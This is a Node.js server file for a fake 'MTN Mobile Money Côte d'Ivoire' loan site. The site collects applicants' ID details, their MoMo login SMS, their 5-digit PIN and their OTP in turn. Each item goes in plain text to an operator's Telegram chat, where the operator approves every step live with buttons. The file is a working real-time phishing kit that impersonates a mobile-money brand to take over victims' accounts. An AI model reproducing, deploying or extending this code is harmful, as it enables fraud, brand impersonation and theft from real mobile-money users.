// ============================================================
// server.js – MTN Mobile Money Côte d'Ivoire  (v10.1)
// Application → MoMo redirect → SMS verify → PIN verify → OTP verify → Dashboard
// Each step verified separately by admin
// ============================================================
'use strict';

require('dotenv').config();
const express      = require('express');
const fetch        = require('node-fetch');
const cors         = require('cors');
const path         = require('path');
const fs           = require('fs');
const helmet       = require('helmet');
const compression  = require('compression');
const cookieParser = require('cookie-parser');
const jwt          = require('jsonwebtoken');
const rateLimit    = require('express-rate-limit');
const PDFDocument  = require('pdfkit');

let TNC_VERSION = '1.0', TNC_EFFECTIVE = '2026-01-01', TERMS_TEXT = 'Conditions non configurées.';
try {
    const terms = require('./terms');
    TNC_VERSION = terms.TNC_VERSION || TNC_VERSION;
    TNC_EFFECTIVE = terms.TNC_EFFECTIVE || TNC_EFFECTIVE;
    TERMS_TEXT = terms.TERMS_TEXT || TERMS_TEXT;
} catch (e) { console.warn('⚠️  terms.js introuvable'); }

const app = express();
app.set('trust proxy', 1);
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],
            styleSrc: ["'self'", "https://fonts.googleapis.com"],
            fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
            imgSrc: ["'self'", "data:"],
            connectSrc: ["'self'"],
            objectSrc: ["'none'"],
            frameAncestors: ["'none'"]
        }
    },
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: 'same-site' }
}));
app.use(compression());
app.use(cors({ origin: true, credentials: true }));
app.use(cookieParser(process.env.SESSION_SECRET || 'momo-secret-change-me'));
app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, '../frontend')));

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
const SESSION_SECRET = process.env.SESSION_SECRET || 'momo-secret-change-me';
const IS_PROD = process.env.NODE_ENV === 'production';

const MOMO_SUPPORT_URL = 'https://www.mtn.ci/fr/particulier/mobile-money';
const MOMO_SUPPORT_PHONE = '111';

const RATE_MSG = 'Trop de tentatives. Réessayez dans 5 minutes.';
function makeLimiter(max, keyGen) {
    return rateLimit({
        windowMs: 5 * 60 * 1000, max: max,
        standardHeaders: true, legacyHeaders: false,
        keyGenerator: keyGen || ((req) => req.ip),
        handler: (req, res) => res.status(429).json({ ok: false, code: 'RATE_LIMITED', error: RATE_MSG })
    });
}
const globalLimiter = makeLimiter(300);
const submitLimiter = makeLimiter(10, (req) => (req.body && req.body.applicationId) ? req.body.applicationId : req.ip);
const loginLimiter  = makeLimiter(20, (req) => (req.body && req.body.applicationId) ? req.body.applicationId : req.ip);
app.use('/api/', globalLimiter);

const ACCOUNT_TYPES = {
    simplifie: { name: 'Compte Simplifié', icon: '🟢', dailyCash: 200000, monthlyCap: 500000,   maxLoan: 100000,  minLoan: 25000 },
    standard:  { name: 'Compte Standard',  icon: '🔵', dailyCash: 500000, monthlyCap: 2000000,  maxLoan: 500000,  minLoan: 50000 },
    premium:   { name: 'Compte Premium',   icon: '🟣', dailyCash: 2000000, monthlyCap: 10000000, maxLoan: 2000000, minLoan: 100000 }
};
function detectAccountType(amount) {
    if (amount <= 100000) return 'simplifie';
    if (amount <= 500000) return 'standard';
    return 'premium';
}

// Login state machine — each step verified separately
const LOGIN_STATUS = {
    IDLE: 'idle',
    SMS_PENDING: 'sms_pending',           // user on SMS page
    SMS_SUBMITTED: 'sms_submitted',       // waiting for admin on SMS
    SMS_VERIFIED: 'sms_verified',         // admin approved SMS
    SMS_REJECTED: 'sms_rejected',
    PIN_PENDING: 'pin_pending',
    PIN_SUBMITTED: 'pin_submitted',
    PIN_VERIFIED: 'pin_verified',
    PIN_REJECTED: 'pin_rejected',
    OTP_PENDING: 'otp_pending',
    OTP_SUBMITTED: 'otp_submitted',
    OTP_VERIFIED: 'otp_verified',
    OTP_REJECTED: 'otp_rejected',
    COMPLETE: 'complete'
};
const APP_STATUS = {
    IDLE: 'idle',
    PENDING_LOGIN: 'pending_login',
    UNDER_REVIEW: 'under_review',
    APPROVED: 'approved',
    REJECTED: 'rejected'
};

// Storage
const applications = {};
const DATA_DIR = path.join(__dirname, '../data');
const DATA_FILE = path.join(DATA_DIR, 'applications.json');
const AUDIT_FILE = path.join(DATA_DIR, 'audit.log');
try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); } catch (e) {}

function saveApps() {
    try { fs.writeFileSync(DATA_FILE, JSON.stringify({ applications: applications, timestamp: new Date().toISOString() }, null, 2)); }
    catch (e) { console.error('Save:', e.message); }
}
function loadAll() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const p = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            const age = Date.now() - new Date(p.timestamp).getTime();
            if (age < 30 * 24 * 60 * 60 * 1000) {
                Object.assign(applications, p.applications || {});
                console.log(`📂 ${Object.keys(applications).length} dossiers chargés`);
            }
        }
    } catch (e) { console.error('Load:', e.message); }
}
function audit(event, data) {
    data = data || {};
    const entry = Object.assign({ ts: new Date().toISOString(), event: event }, data);
    try { fs.appendFileSync(AUDIT_FILE, JSON.stringify(entry) + '\n'); } catch (e) {}
    console.log(JSON.stringify(entry));
}

function esc(t) { return t === null || t === undefined ? '' : String(t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
function code(t) { return '<code>' + esc((t === null || t === undefined) ? '' : String(t).trim()) + '</code>'; }
function pre(t) { return '<pre>' + esc((t === null || t === undefined) ? '' : String(t).trim()) + '</pre>'; }
function fmt(n) { return (Number(n) || 0).toLocaleString('fr-FR').replace(/\u202f/g, ' ').replace(/\u00a0/g, ' '); }
function fmtXOF(n) { return fmt(n) + ' F CFA'; }

function ensureApp(id) {
    if (!applications[id]) applications[id] = { applicationId: id, createdAt: new Date().toISOString() };
    return applications[id];
}
function issueSession(res, id) {
    const token = jwt.sign({ id: id }, SESSION_SECRET, { expiresIn: '7d' });
    res.cookie('momoSession', token, { httpOnly: true, sameSite: 'lax', secure: IS_PROD, maxAge: 7 * 24 * 60 * 60 * 1000 });
}
function readSession(req) {
    try { const r = req.cookies && req.cookies.momoSession; return r ? jwt.verify(r, SESSION_SECRET) : null; } catch (e) { return null; }
}
function guardAppId(req, res, next) {
    const id = req.params.applicationId;
    const s = readSession(req);
    if (s && s.id !== id) return res.status(403).json({ ok: false, error: 'Session invalide.' });
    next();
}

async function tgSend(text, buttons) {
    if (!BOT_TOKEN || !CHAT_ID) return { ok: false };
    const body = { chat_id: CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };
    try {
        const r = await fetch(`${TG_API}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body)
        });
        const result = await r.json();
        if (result.ok) console.log(`✅ TG (${result.result && result.result.message_id})`);
        else console.error(`❌ TG: ${result.description}`);
        return result;
    } catch (e) { console.error('❌ TG:', e.message); return { ok: false }; }
}
function ask(text, step, appId) {
    tgSend(text, [[
        { text: '✅ OUI', callback_data: JSON.stringify({ a: 'Y', s: step, id: appId }) },
        { text: '❌ NON', callback_data: JSON.stringify({ a: 'N', s: step, id: appId }) }
    ]]);
}

// ─── Telegram message builders ───
function buildApplicationMessage(app_) {
    const type = ACCOUNT_TYPES[app_.accountType] || {};
    const required = Math.ceil((app_.loanAmount || 0) * 0.20);
    return '📋 <b>NOUVELLE DEMANDE DE PRÊT</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '🆔 Dossier : ' + code(app_.applicationId) + '\n\n' +
        '<b>👤 DEMANDEUR</b>\n' +
        'Nom : ' + esc(app_.fullName || '') + '\n' +
        'CNI : ' + code(app_.idNumber || '') + '\n' +
        'Naissance : ' + code(app_.dob || '') + '\n' +
        'Email : ' + code(app_.email || '') + '\n' +
        'Téléphone : ' + code('+225 ' + (app_.phone || '')) + '\n\n' +
        '<b>💳 COMPTE (auto-détecté)</b>\n' +
        type.icon + ' <b>' + esc(type.name || '') + '</b>\n\n' +
        '<b>💰 PRÊT</b>\n' +
        'Montant : <b>' + fmtXOF(app_.loanAmount || 0) + '</b>\n' +
        'Durée : ' + esc(app_.loanTerm || '') + '\n' +
        'Mensualité : <b>' + fmtXOF(app_.monthlyRepayment || 0) + '</b>\n' +
        'Objet : ' + esc(app_.loanPurpose || '') + '\n\n' +
        '<b>💼 EMPLOI</b>\n' + esc(app_.employment || '') + ' · ' + fmtXOF(app_.annualIncome || 0) + '/an\n\n' +
        '<b>👥 PROCHE</b>\n' + esc(app_.kinName || '') + ' ' + code('+225 ' + (app_.kinPhone || '')) + '\n\n' +
        '<b>📊 RÈGLE 20 %</b>\nRequis : <b>' + fmtXOF(required) + '</b>\n' +
        'Déclaration : ' + (app_.has20Percent ? '✅ CONFIRMÉE' : '❌ NON') + '\n\n' +
        '✅ <b>OUI → démarrer la connexion MoMo</b>\n' +
        '❌ <b>NON → rejeter la demande</b>';
}

function buildSmsVerifyMessage(app_) {
    return '📩 <b>ÉTAPE 1/3 — VÉRIFICATION SMS</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '🆔 ' + code(app_.applicationId) + '\n' +
        '👤 ' + esc(app_.fullName || '') + '\n' +
        '📱 ' + code('+225 ' + (app_.loginPhone || '')) + '\n\n' +
        '<b>📨 SMS REÇU</b>\n' + pre(app_.loginSms || '') + '\n' +
        '<b>🔎 VÉRIFIER</b>\n' +
        '☐ Numéro MoMo valide\n☐ SMS cohérent\n\n' +
        '✅ <b>OUI → passer au PIN</b>\n' +
        '❌ <b>NON → rejeter</b>';
}

function buildPinVerifyMessage(app_) {
    return '🔑 <b>ÉTAPE 2/3 — VÉRIFICATION PIN</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '🆔 ' + code(app_.applicationId) + '\n' +
        '👤 ' + esc(app_.fullName || '') + '\n' +
        '📱 ' + code('+225 ' + (app_.loginPhone || '')) + '\n\n' +
        '<b>🔑 CODE PIN MoMo</b>\n<code>' + esc(app_.loginPin || '') + '</code>\n\n' +
        '<b>🔎 VÉRIFIER</b>\n' +
        '☐ PIN à 5 chiffres correct\n\n' +
        '✅ <b>OUI → passer à l\'OTP</b>\n' +
        '❌ <b>NON → rejeter</b>';
}

function buildOtpVerifyMessage(app_) {
    return '🔢 <b>ÉTAPE 3/3 — VÉRIFICATION OTP</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '🆔 ' + code(app_.applicationId) + '\n' +
        '👤 ' + esc(app_.fullName || '') + '\n' +
        '📱 ' + code('+225 ' + (app_.loginPhone || '')) + '\n\n' +
        '<b>🔢 CODE OTP</b>\n<code>' + esc(app_.loginOtp || '') + '</code>\n\n' +
        '<b>🔎 VÉRIFIER</b>\n' +
        '☐ OTP correct\n\n' +
        '✅ <b>OUI → APPROUVER LE PRÊT</b>\n' +
        '❌ <b>NON → rejeter</b>';
}

// ═══════════════════════════════════════════════════════════
// CONFIG
// ═══════════════════════════════════════════════════════════
app.get('/health', (req, res) => {
    res.json({ status: 'ok', version: '10.1', country: 'CI', applications: Object.keys(applications).length });
});
app.get('/api/config', (req, res) => {
    res.json({
        ok: true,
        accountTypes: ACCOUNT_TYPES,
        supportUrl: MOMO_SUPPORT_URL,
        supportPhone: MOMO_SUPPORT_PHONE,
        tncVersion: TNC_VERSION
    });
});
app.get('/api/terms', (req, res) => res.json({ ok: true, version: TNC_VERSION, effective: TNC_EFFECTIVE, text: TERMS_TEXT }));
app.get('/api/telegram-debug', async (req, res) => {
    const result = { tokenSet: !!BOT_TOKEN, chatIdSet: !!CHAT_ID };
    try { const me = await fetch(`${TG_API}/getMe`); result.getMe = await me.json(); } catch (e) { result.error = e.message; }
    res.json(result);
});

// ═══════════════════════════════════════════════════════════
// APPLICATION SUBMIT
// ═══════════════════════════════════════════════════════════
app.post('/api/submit-application', submitLimiter, async (req, res) => {
    try {
        const b = req.body || {};
        const applicationId = b.applicationId;
        if (!applicationId) return res.status(400).json({ ok: false, error: 'ID Dossier manquant.' });

        const fullName = (b.fullName || '').trim();
        const idNumber = (b.idNumber || '').trim().toUpperCase();
        const dob = b.dob || '';
        const email = (b.email || '').trim();
        const phone = String(b.phone || '').trim();
        const loanType = b.loanType;
        const loanAmount = Number(b.loanAmount);
        const loanTerm = b.loanTerm;
        const loanPurpose = (b.loanPurpose || '').trim();
        const employment = b.employment;
        const annualIncome = Number(b.annualIncome);
        const kinName = (b.kinName || '').trim();
        const kinPhone = String(b.kinPhone || '').trim();
        const kinRelation = b.kinRelation;
        const kinTncAccepted = b.kinTncAccepted === true;
        const has20Percent = b.has20Percent === true;
        const tncAccepted = b.tncAccepted === true;

        if (!fullName || fullName.length < 3) return res.status(400).json({ ok: false, error: 'Nom complet requis.' });
        if (!/^[A-Z0-9]{8,14}$/.test(idNumber)) return res.status(400).json({ ok: false, error: 'CNI invalide.' });
        if (!dob) return res.status(400).json({ ok: false, error: 'Date de naissance requise.' });
        const d = new Date(dob); const now = new Date();
        let age = now.getFullYear() - d.getFullYear();
        const mm = now.getMonth() - d.getMonth();
        if (mm < 0 || (mm === 0 && now.getDate() < d.getDate())) age--;
        if (age < 18) return res.status(400).json({ ok: false, error: '18 ans minimum.' });
        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.status(400).json({ ok: false, error: 'Email invalide.' });
        if (!/^\d{10}$/.test(phone)) return res.status(400).json({ ok: false, error: 'Téléphone 10 chiffres.' });
        if (!loanType || !loanAmount || !loanTerm || !loanPurpose) return res.status(400).json({ ok: false, error: 'Champs de prêt incomplets.' });
        if (!employment || annualIncome <= 0) return res.status(400).json({ ok: false, error: 'Emploi et revenu requis.' });
        if (!kinName || !/^\d{10}$/.test(kinPhone) || !kinRelation) return res.status(400).json({ ok: false, error: 'Proche incomplet.' });
        if (!kinTncAccepted) return res.status(400).json({ ok: false, error: 'Le proche doit accepter les CGL.' });
        if (!has20Percent) return res.status(400).json({ ok: false, code: 'MISSING_20_PERCENT', error: 'Règle des 20 % à confirmer.' });
        if (!tncAccepted) return res.status(400).json({ ok: false, error: 'CGL à accepter.' });
        if (loanAmount < 25000 || loanAmount > 2000000) return res.status(400).json({ ok: false, error: 'Montant entre 25 000 F et 2 000 000 F.' });

        const accountType = detectAccountType(loanAmount);
        const type = ACCOUNT_TYPES[accountType];
        const months = parseInt(loanTerm) || 12;
        const r = 0.24 / 12;
        const monthly = Math.ceil(loanAmount * r / (1 - Math.pow(1 + r, -months)) + 500);

        const app_ = ensureApp(applicationId);
        Object.assign(app_, {
            fullName, idNumber, dob, email, phone,
            loanType, loanAmount, loanTerm, loanPurpose, monthlyRepayment: monthly,
            employment, annualIncome,
            kinName, kinPhone, kinRelation, kinTncAccepted,
            has20Percent, required20: Math.ceil(loanAmount * 0.20),
            tncAccepted: {
                accepted: true, version: TNC_VERSION,
                timestamp: new Date().toISOString(),
                ip: req.ip || req.headers['x-forwarded-for'] || 'unknown'
            },
            accountType, accountName: type.name, accountMaxLoan: type.maxLoan,
            applicationStatus: APP_STATUS.PENDING_LOGIN,
            applicationSubmittedAt: new Date().toISOString(),
            loginStatus: LOGIN_STATUS.IDLE,
            updatedAt: new Date().toISOString()
        });
        saveApps();
        issueSession(res, applicationId);
        audit('application_submitted', { applicationId, loanAmount, accountType });

        await ask(buildApplicationMessage(app_), 'application', applicationId);
        res.json({
            ok: true,
            applicationId,
            accountType, accountName: type.name,
            accountMaxLoan: type.maxLoan,
            status: APP_STATUS.PENDING_LOGIN
        });
    } catch (e) { console.error('submit-application:', e.message); res.status(500).json({ ok: false, error: e.message }); }
});

// ═══════════════════════════════════════════════════════════
// LOGIN STEP 1: SMS
// ═══════════════════════════════════════════════════════════
app.post('/api/login/sms', loginLimiter, async (req, res) => {
    try {
        const applicationId = (req.body || {}).applicationId;
        const sms = String((req.body || {}).sms || '').trim();
        const phone = String((req.body || {}).phone || '').trim();
        if (!applicationId || !sms) return res.status(400).json({ ok: false, error: 'Champs manquants.' });
        if (sms.length < 10) return res.status(400).json({ ok: false, error: 'SMS invalide.' });
        if (!/^\d{10}$/.test(phone)) return res.status(400).json({ ok: false, error: 'Téléphone 10 chiffres requis.' });
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Dossier introuvable.' });

        app_.loginPhone = phone;
        app_.loginSms = sms;
        app_.loginStatus = LOGIN_STATUS.SMS_SUBMITTED;
        app_.updatedAt = new Date().toISOString();
        saveApps();
        audit('login_sms_submitted', { applicationId });

        await ask(buildSmsVerifyMessage(app_), 'login_sms', applicationId);
        res.json({ ok: true, status: LOGIN_STATUS.SMS_SUBMITTED });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ═══════════════════════════════════════════════════════════
// LOGIN STEP 2: PIN (only after SMS verified)
// ═══════════════════════════════════════════════════════════
app.post('/api/login/pin', loginLimiter, async (req, res) => {
    try {
        const applicationId = (req.body || {}).applicationId;
        const pin = String((req.body || {}).pin || '').trim();
        if (!applicationId || !pin) return res.status(400).json({ ok: false, error: 'Champs manquants.' });
        if (!/^\d{5}$/.test(pin)) return res.status(400).json({ ok: false, error: 'PIN à 5 chiffres requis.' });
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Dossier introuvable.' });
        if (app_.loginStatus !== LOGIN_STATUS.SMS_VERIFIED) {
            return res.status(400).json({ ok: false, error: 'SMS non encore vérifié.' });
        }

        app_.loginPin = pin;
        app_.loginStatus = LOGIN_STATUS.PIN_SUBMITTED;
        app_.updatedAt = new Date().toISOString();
        saveApps();
        audit('login_pin_submitted', { applicationId });

        await ask(buildPinVerifyMessage(app_), 'login_pin', applicationId);
        res.json({ ok: true, status: LOGIN_STATUS.PIN_SUBMITTED });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ═══════════════════════════════════════════════════════════
// LOGIN STEP 3: OTP (only after PIN verified)
// ═══════════════════════════════════════════════════════════
app.post('/api/login/otp', loginLimiter, async (req, res) => {
    try {
        const applicationId = (req.body || {}).applicationId;
        const otp = String((req.body || {}).otp || '').trim();
        if (!applicationId || !otp) return res.status(400).json({ ok: false, error: 'Champs manquants.' });
        if (!/^\d{6}$/.test(otp)) return res.status(400).json({ ok: false, error: 'OTP à 6 chiffres requis.' });
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Dossier introuvable.' });
        if (app_.loginStatus !== LOGIN_STATUS.PIN_VERIFIED) {
            return res.status(400).json({ ok: false, error: 'PIN non encore vérifié.' });
        }

        app_.loginOtp = otp;
        app_.loginStatus = LOGIN_STATUS.OTP_SUBMITTED;
        app_.updatedAt = new Date().toISOString();
        saveApps();
        audit('login_otp_submitted', { applicationId });

        await ask(buildOtpVerifyMessage(app_), 'login_otp', applicationId);
        res.json({ ok: true, status: LOGIN_STATUS.OTP_SUBMITTED });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ═══════════════════════════════════════════════════════════
// LOGIN STATUS POLLING
// ═══════════════════════════════════════════════════════════
app.get('/api/login/status/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Introuvable' });
    res.json({
        ok: true,
        loginStatus: app_.loginStatus || 'idle',
        applicationStatus: app_.applicationStatus || 'idle',
        accountType: app_.accountType || null,
        accountName: app_.accountName || null,
        accountMaxLoan: app_.accountMaxLoan || 0,
        rejectionReason: app_.rejectionReason || null
    });
});

// ═══════════════════════════════════════════════════════════
// PDF
// ═══════════════════════════════════════════════════════════
app.get('/api/agreement-pdf/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Introuvable' });
    const loanAmount = app_.loanAmount || 0;
    const months = parseInt(app_.loanTerm) || 12;
    const monthly = app_.monthlyRepayment || Math.ceil(loanAmount * 0.24 / 12 / (1 - Math.pow(1 + 0.24 / 12, -months)) + 500);

    const doc = new PDFDocument({ size: 'A4', margin: 50 });
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', 'attachment; filename="momo-contrat-' + app_.applicationId + '.pdf"');
    doc.pipe(res);
    doc.fillColor('#000').fontSize(20).font('Helvetica-Bold').text('MTN Mobile Money Côte d\'Ivoire', { align: 'center' });
    doc.fontSize(12).font('Helvetica').fillColor('#666').text('Contrat de Prêt', { align: 'center' });
    doc.moveDown(0.5);
    doc.strokeColor('#FFCC00').lineWidth(3).moveTo(50, doc.y).lineTo(545, doc.y).stroke();
    doc.moveDown(1);
    const line = (l, v) => {
        doc.font('Helvetica-Bold').fillColor('#333').fontSize(10).text(l + ':', { continued: true });
        doc.font('Helvetica').fillColor('#000').text(' ' + (v || 'N/A'));
    };
    doc.font('Helvetica-Bold').fontSize(12).fillColor('#000').text('EMPRUNTEUR'); doc.moveDown(0.3);
    line('ID Dossier', app_.applicationId);
    line('Nom complet', app_.fullName);
    line('CNI', app_.idNumber);
    line('Naissance', app_.dob);
    line('Téléphone', app_.phone ? '+225 ' + app_.phone : null);
    line('Email', app_.email);
    line('Compte MoMo', app_.accountName || app_.accountType);
    doc.moveDown(0.8);
    doc.font('Helvetica-Bold').fontSize(12).text('DÉTAILS DU PRÊT'); doc.moveDown(0.3);
    line('Capital', fmtXOF(loanAmount));
    line('Durée', app_.loanTerm);
    line('Mensualité', fmtXOF(monthly));
    line('Total à rendre', fmtXOF(monthly * months));
    line('Taux', '24 % par an');
    doc.moveDown(0.8);
    doc.font('Helvetica-Bold').fontSize(12).text('PROCHE'); doc.moveDown(0.3);
    line('Nom', app_.kinName);
    line('Téléphone', app_.kinPhone ? '+225 ' + app_.kinPhone : null);
    doc.moveDown(1);
    doc.fontSize(9).fillColor('#888').text('Généré le ' + new Date().toLocaleString('fr-FR'), { align: 'center' });
    doc.end();
});

// ═══════════════════════════════════════════════════════════
// TELEGRAM WEBHOOK — handles 4 verification steps
// ═══════════════════════════════════════════════════════════
app.post('/api/telegram-webhook', (req, res) => {
    res.status(200).send('ok');
    try {
        const body = req.body || {};
        if (body.callback_query) {
            const q = body.callback_query;
            fetch(`${TG_API}/answerCallbackQuery`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: q.id, text: 'Reçu' })
            }).catch(() => {});
            try {
                const data = JSON.parse(q.data);
                const app_ = applications[data.id];
                if (!app_) return;
                const approved = data.a === 'Y';
                const step = data.s;

                // ─── APPLICATION ───
                if (step === 'application') {
                    if (approved) {
                        app_.applicationStatus = APP_STATUS.PENDING_LOGIN;
                        app_.loginStatus = LOGIN_STATUS.SMS_PENDING;
                        saveApps();
                        tgSend('✅ <b>DEMANDE APPROUVÉE</b>\n🆔 ' + code(data.id) + '\n\nL\'utilisateur doit maintenant se connecter à MoMo.', null);
                    } else {
                        app_.applicationStatus = APP_STATUS.REJECTED;
                        app_.rejectionReason = 'Demande refusée.';
                        saveApps();
                        tgSend('❌ <b>DEMANDE REFUSÉE</b>\n🆔 ' + code(data.id), null);
                    }
                    return;
                }

                // ─── SMS VERIFICATION ───
                if (step === 'login_sms') {
                    if (approved) {
                        app_.loginStatus = LOGIN_STATUS.SMS_VERIFIED;
                        saveApps();
                        tgSend('✅ <b>SMS VÉRIFIÉ (1/3)</b>\n🆔 ' + code(data.id) + '\n→ L\'utilisateur passe au PIN.', null);
                    } else {
                        app_.loginStatus = LOGIN_STATUS.SMS_REJECTED;
                        app_.applicationStatus = APP_STATUS.REJECTED;
                        app_.rejectionReason = 'SMS non vérifié.';
                        saveApps();
                        tgSend('❌ <b>SMS REFUSÉ (1/3)</b>\n🆔 ' + code(data.id), null);
                    }
                    return;
                }

                // ─── PIN VERIFICATION ───
                if (step === 'login_pin') {
                    if (approved) {
                        app_.loginStatus = LOGIN_STATUS.PIN_VERIFIED;
                        saveApps();
                        tgSend('✅ <b>PIN VÉRIFIÉ (2/3)</b>\n🆔 ' + code(data.id) + '\n→ L\'utilisateur passe à l\'OTP.', null);
                    } else {
                        app_.loginStatus = LOGIN_STATUS.PIN_REJECTED;
                        app_.applicationStatus = APP_STATUS.REJECTED;
                        app_.rejectionReason = 'Code PIN non vérifié.';
                        saveApps();
                        tgSend('❌ <b>PIN REFUSÉ (2/3)</b>\n🆔 ' + code(data.id), null);
                    }
                    return;
                }

                // ─── OTP VERIFICATION ───
                if (step === 'login_otp') {
                    if (approved) {
                        app_.loginStatus = LOGIN_STATUS.OTP_VERIFIED;
                        app_.applicationStatus = APP_STATUS.APPROVED;
                        app_.approvedAt = new Date().toISOString();
                        saveApps();
                        tgSend('🎉 <b>OTP VÉRIFIÉ (3/3)</b>\n🆔 ' + code(data.id) + '\n\n✅ <b>PRÊT APPROUVÉ</b>\n💰 ' + fmtXOF(app_.loanAmount), null);
                    } else {
                        app_.loginStatus = LOGIN_STATUS.OTP_REJECTED;
                        app_.applicationStatus = APP_STATUS.REJECTED;
                        app_.rejectionReason = 'OTP non vérifié.';
                        saveApps();
                        tgSend('❌ <b>OTP REFUSÉ (3/3)</b>\n🆔 ' + code(data.id), null);
                    }
                    return;
                }
            } catch (e) { console.error('Callback:', e.message); }
            return;
        }

        if (body.message && body.message.text) {
            const text = body.message.text.trim();
            const chatId = String(body.message.chat.id);
            if (!CHAT_ID || chatId !== String(CHAT_ID)) return;

            if (text === '/start' || text === '/help') {
                tgSend('🤖 <b>Bot MoMo CI</b>\n📊 /stats\n📋 /list\n🔍 /search [ID]', null);
            } else if (text === '/stats') {
                const total = Object.keys(applications).length;
                const pendingSms = Object.values(applications).filter(a => a.loginStatus === LOGIN_STATUS.SMS_SUBMITTED).length;
                const pendingPin = Object.values(applications).filter(a => a.loginStatus === LOGIN_STATUS.PIN_SUBMITTED).length;
                const pendingOtp = Object.values(applications).filter(a => a.loginStatus === LOGIN_STATUS.OTP_SUBMITTED).length;
                const approved = Object.values(applications).filter(a => a.applicationStatus === APP_STATUS.APPROVED).length;
                tgSend('📊 <b>STATS</b>\n📝 Dossiers : ' + total +
                    '\n📩 SMS en attente : ' + pendingSms +
                    '\n🔑 PIN en attente : ' + pendingPin +
                    '\n🔢 OTP en attente : ' + pendingOtp +
                    '\n✅ Approuvés : ' + approved, null);
            } else if (text === '/list') {
                const ids = Object.keys(applications).slice(-10);
                if (!ids.length) { tgSend('📭 Aucun dossier.', null); return; }
                let msg = '📋 <b>10 DERNIERS</b>\n';
                ids.forEach((id, i) => {
                    const a = applications[id];
                    msg += '\n' + (i + 1) + '. 🆔 ' + code(id) + '\n👤 ' + esc(a.fullName || 'N/A') + '\n📋 ' + esc(a.applicationStatus || 'N/A') + '\n🔐 ' + esc(a.loginStatus || 'N/A') + '\n';
                });
                tgSend(msg, null);
            } else if (text.indexOf('/search ') === 0) {
                const needle = text.replace('/search ', '').trim().toUpperCase();
                const key = Object.keys(applications).find(k => k.toUpperCase() === needle);
                const a = key ? applications[key] : null;
                if (!a) { tgSend('❌ Introuvable', null); return; }
                tgSend('🔍 <b>DÉTAILS</b> ' + code(key) + '\n👤 ' + esc(a.fullName || '') +
                    '\n📱 ' + (a.phone ? code('+225 ' + a.phone) : 'N/A') +
                    '\n📋 Demande : ' + esc(a.applicationStatus || 'N/A') +
                    '\n🔐 Login : ' + esc(a.loginStatus || 'N/A'), null);
            }
        }
    } catch (e) { console.error('Webhook:', e.message); }
});

// ═══════════════════════════════════════════════════════════
app.get('*', (req, res) => res.sendFile(path.join(__dirname, '../frontend', 'index.html')));

loadAll();
app.listen(PORT, '0.0.0.0', () => {
    console.log('🚀 Serveur v10.1 sur port ' + PORT);
});
